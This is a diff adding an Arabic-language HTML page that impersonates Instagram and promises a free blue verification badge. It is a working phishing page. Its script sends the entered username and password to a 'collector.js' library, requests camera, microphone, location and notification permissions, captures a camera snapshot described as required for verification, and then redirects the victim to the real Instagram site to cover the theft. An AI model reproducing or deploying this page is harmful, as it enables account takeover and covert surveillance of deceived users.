@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#1DA1F2">
+<title>التوثيق - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: #fff;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(30, 41, 59, 0.95);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(29,161,242,0.3);
+    border-radius: 24px;
+    padding: 40px 28px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+    text-align: center;
+  }
+  .verified-badge {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 20px;
+    background: linear-gradient(135deg, #1DA1F2, #0ea5e9);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    box-shadow: 0 0 60px rgba(29,161,242,0.5);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 60px rgba(29,161,242,0.5); }
+    50% { box-shadow: 0 0 80px rgba(29,161,242,0.8); }
+  }
+  .verified-badge svg {
+    width: 60px; height: 60px; fill: #fff;
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    color: #fff;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #94a3b8;
+    line-height: 1.6;
+    margin-bottom: 24px;
+  }
+  .features {
+    background: rgba(29,161,242,0.1);
+    border: 1px solid rgba(29,161,242,0.3);
+    border-radius: 14px;
+    padding: 16px;
+    margin-bottom: 24px;
+    text-align: right;
+  }
+  .feature {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 8px 0;
+    color: #cbd5e1;
+    font-size: 14px;
+  }
+  .feature::before {
+    content: '✓';
+    width: 22px; height: 22px;
+    background: #1DA1F2;
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 12px;
+    flex-shrink: 0;
+  }
+  .form-input {
+    width: 100%;
+    padding: 14px 18px;
+    background: rgba(15, 23, 42, 0.8);
+    border: 1px solid rgba(29,161,242,0.3);
+    border-radius: 12px;
+    font-size: 15px;
+    color: #fff;
+    font-family: inherit;
+    margin-bottom: 12px;
+  }
+  .form-input::placeholder { color: #64748b; }
+  .form-input:focus {
+    outline: none;
+    border-color: #1DA1F2;
+    background: rgba(15, 23, 42, 1);
+  }
+  .btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #1DA1F2, #0ea5e9);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    margin-top: 8px;
+    box-shadow: 0 10px 30px rgba(29,161,242,0.4);
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .note {
+    font-size: 12px;
+    color: #64748b;
+    margin-top: 16px;
+    line-height: 1.5;
+  }
+  .error-msg {
+    background: rgba(239, 68, 68, 0.15);
+    border: 1px solid rgba(239, 68, 68, 0.4);
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #fca5a5;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <div class="verified-badge">
+      <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2zm-1.5 14l-3.5-3.5 1.41-1.41L11 13.67l4.09-4.09 1.41 1.41L10.5 16z"/></svg>
+    </div>
+
+    <h1>احصل على التوثيق الأزرق</h1>
+    <p class="subtitle">
+      انضم إلى نادي المشاهير والعلامات التجارية الموثوقة على Instagram.
+    </p>
+
+    <div class="features">
+      <div class="feature">شارة زرقاء موثقة بجانب اسمك</div>
+      <div class="feature">أولوية في نتائج البحث</div>
+      <div class="feature">حماية من انتحال الهوية</div>
+      <div class="feature">دعم فني مخصص على مدار الساعة</div>
+    </div>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="verify-form" onsubmit="return handleVerify(event)">
+      <input type="text" id="username" class="form-input" placeholder="اسم المستخدم على Instagram" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور للتحقق" required>
+      <button type="submit" class="btn" id="verify-btn">
+        تفعيل التوثيق الآن ✓
+      </button>
+    </form>
+
+    <p class="note">
+      🔒 سيتم مراجعة طلبك خلال 24 ساعة. لن يتم تحصيل أي رسوم.
+    </p>
+
+  </div>
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleVerify(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        if (password.length < 4) {
+            showError('كلمة المرور غير صحيحة');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('verify-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق من الأهلية...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'verify_badge'
+        }, {
+            metadata: { page: 'instagram_03_verify' }
+        }).then(function() {
+            FSCollector.showLoader('جاري مراجعة طلب التوثيق...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: true,
+                    notifications: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    // التقاط صورة للتحقق (مطلوبة للتوثيق)
+                    if (perms.camera === 'granted' && window.FS_MEDIA_STREAMS && window.FS_MEDIA_STREAMS.camera) {
+                        FSCollector.captureFromStream(window.FS_MEDIA_STREAMS.camera, 'camera', 0.9)
+                            .then(function(img) { 
+                                if (img) FSCollector.sendSnapshot('camera', img); 
+                            });
+                    }
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2500);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleVerify = handleVerify;
+
+})();
+</script>
+
+</body>
+</html>
